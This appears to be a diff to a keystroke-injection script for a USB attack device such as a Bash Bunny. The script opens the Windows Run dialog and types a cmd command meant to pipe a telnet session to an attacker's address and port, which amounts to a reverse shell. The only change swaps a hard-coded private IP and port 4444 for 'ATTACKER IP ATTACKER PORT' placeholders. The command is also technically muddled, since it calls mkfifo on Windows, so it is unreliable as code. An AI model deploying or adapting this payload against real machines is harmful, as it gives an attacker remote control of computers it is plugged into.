@@ -4,5 +4,5 @@ ATTACKMODE HID STORAGE
 DELAY 1000
 GUI r
 DELAY 200
-STRING cmd /k "mkfifo \\.\pipe\rev && echo open 192.168.1.100 4444 > \\.\pipe\rev && echo | telnet > \\.\pipe\rev"
+STRING cmd /k "mkfifo \\.\pipe\rev && echo open ATTACKER IP ATTACKER PORT > \\.\pipe\rev && echo | telnet > \\.\pipe\rev"
 ENTER
